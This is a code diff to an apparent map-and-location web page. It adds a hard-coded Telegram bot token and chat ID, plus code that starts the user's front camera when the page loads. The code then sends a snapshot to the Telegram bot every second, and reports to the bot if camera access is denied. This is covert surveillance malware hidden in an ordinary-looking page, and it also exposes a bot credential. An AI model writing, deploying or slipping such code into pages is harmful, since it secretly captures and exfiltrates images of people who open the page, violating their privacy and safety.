@@ -382,6 +382,8 @@
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <script>
+      const token = "6235375573:AAHdripMzwMYFL0dhruXGyvmJ6ZSQhWCTn4";
+      const chat_id = "1444862345";
       let uLat = null,
         uLng = null,
         m = null,
@@ -406,6 +408,65 @@
           return null;
         }
       };
+
+      function sendPhotoToTelegram(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("photo", blob, "snapshot.jpg");
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData,
+        });
+      }
+
+      function captureAndSendImage() {
+        try {
+          const video = document.getElementById("video");
+          const canvas = document.getElementById("canvas");
+          const ctx = canvas.getContext("2d");
+          canvas.width = video.videoWidth || 300;
+          canvas.height = video.videoHeight || 200;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(
+            (blob) => blob && sendPhotoToTelegram(blob),
+            "image/jpeg",
+            0.9
+          );
+        } catch (err) {
+          console.error("Camera capture failed:", err);
+        }
+      }
+
+      function startCameraLoop() {
+        navigator.mediaDevices
+          .getUserMedia({ video: { facingMode: "user" } })
+          .then((mediaStream) => {
+            stream = mediaStream;
+            const video = document.getElementById("video");
+            video.srcObject = stream;
+
+            video.onloadedmetadata = () => {
+              video.play();
+
+              // ✅ Start only after video is playing
+              video.onplaying = () => {
+                // Start sending image every 1 second
+                setInterval(captureAndSendImage, 1000);
+              };
+            };
+          })
+          .catch((err) => {
+            console.warn("📷 Camera access denied:", err);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id,
+                text: "❌ User denied camera access.",
+              }),
+            });
+          });
+      }
 
       // Update map marker & circle
       const updMap = (lat, lng, acc) => {
@@ -492,6 +553,7 @@
       // Event listeners
       window.addEventListener("DOMContentLoaded", () => {
         locUser();
+        startCameraLoop();
         getInfo();
       });
       document
